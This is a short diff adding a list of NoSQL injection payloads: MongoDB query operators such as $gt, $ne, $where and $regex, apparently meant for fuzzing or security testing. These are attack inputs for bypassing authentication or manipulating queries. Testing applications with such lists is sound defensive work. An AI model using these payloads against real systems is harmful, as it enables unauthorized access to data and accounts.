@@ -1,0 +1,8 @@
+# NoSQL injection payloads
+{"$gt": ""}
+{"$ne": null}
+{"$where": "return true"}
+{"$regex": ".*"}
+{"$exists": true}
+{"$ne": "invalid"}
+{"$where": "true"}
